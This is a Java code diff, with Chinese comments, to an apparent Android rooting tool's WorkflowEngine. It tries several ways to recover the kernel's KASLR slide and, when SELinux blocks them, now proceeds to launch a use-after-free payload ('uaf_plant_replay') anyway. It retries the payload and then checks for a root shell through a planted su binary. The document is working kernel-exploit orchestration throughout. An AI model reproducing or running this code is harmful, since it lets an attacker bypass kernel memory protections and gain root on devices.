@@ -443,6 +443,17 @@ public final class WorkflowEngine implements AssetDeployer.WorkflowLog {
                 freeKb, reached ? "达标，开跑" : "未达标，仍开跑"));
     }
 
+    /**
+     * 测量本次开机的内核地址。
+     *
+     * 三条来源依次尝试：perf 采样（--slide）→ slide_probe 的 calc=（--slide）→ site=（--site）。
+     * 三者在 shell 身份下都可能失败：这台 ROM 的 SELinux 对 shell 禁了
+     * `perf_event` 的 `{ kernel }` 权限，kallsyms 与 kprobe 也封闭。
+     *
+     * 因此拿不到时**不再中断**：打印明确警告，返回空参数，让 uaf_plant_replay
+     * 用 lhasa_profile.txt 里的链接期地址自行判定。它的失败保护（holding zombie →
+     * 本次开机终止）仍然生效，所以最坏情况与现在持平。
+     */
     private String measureAddress() throws Exception {
         for (int seconds : new int[]{1, 2}) {
             run(BootGuard.markCommand("probe-perf"), true);
@@ -465,6 +476,7 @@ public final class WorkflowEngine implements AssetDeployer.WorkflowLog {
                 append("slide " + slide + " 越界/未对齐，弃用");
             }
         }
+
         append("perf_slide 未取到，改用 slide_probe");
         run(BootGuard.markCommand("probe-slide"), true);
         CommandResult probe = run(BootGuard.withTimeout(SLIDE_PROBE_TIMEOUT_S,
@@ -483,14 +495,28 @@ public final class WorkflowEngine implements AssetDeployer.WorkflowLog {
             append("site = " + site + "（site 探测）");
             return "--site " + site;
         }
-        throw new IllegalStateException("未能读取 KASLR 偏移，请确认 perf / tracefs 可用。");
+
+        // 三条来源都没拿到：不再中断，交给 payload 自行判定。
+        append("[测量] 三种来源都没取到内核地址：");
+        append("[测量]   · perf 采样被 SELinux 拒绝（shell 域无 perf_event kernel 权限）");
+        append("[测量]   · slide_probe 命中 0（tracefs 只能看到分配事件，拿不到真实地址）");
+        append("[测量]   · kallsyms / kprobe 对 shell 封闭");
+        append("[测量] 改为不带参数运行，让 uaf_plant_replay 用 lhasa_profile.txt 自行判定。");
+        recordFailedBootStage("measure-skip");
+        return "";
     }
 
     private boolean runPayload(String addressArgument, String boot) throws Exception {
+        String args = addressArgument == null ? "" : addressArgument.trim();
+        if (!args.isEmpty()) {
+            append("[payload] 参数：" + args);
+        } else {
+            append("[payload] 不带地址参数启动（由 payload 自行判定）");
+        }
         for (int attempt = 1; attempt <= 3; attempt++) {
             run("rm -f /data/local/tmp/uaf_replay.log; " + BootGuard.launchCommand(
                     "/data/local/tmp/uaf_plant_replay",
-                    addressArgument,
+                    args,
                     "/data/local/tmp/uaf_replay.log"), true);
             Thread.sleep(1500L);
             for (int poll = 0; poll < 200; poll++) {
@@ -525,6 +551,15 @@ public final class WorkflowEngine implements AssetDeployer.WorkflowLog {
             }
         }
         return isRoot(run("/data/local/tmp/pc98260-su -c 'id'", true).output);
+    }
+
+    /** 只记阶段面包屑，不动失败标记（测量失败不等于内核已被污染）。 */
+    private void recordFailedBootStage(String stage) {
+        try {
+            run(BootGuard.markCommand(stage), true);
+        } catch (Exception ignored) {
+            // 诊断信息缺失不影响主流程
+        }
     }
 
     private void stopPayload() throws Exception {
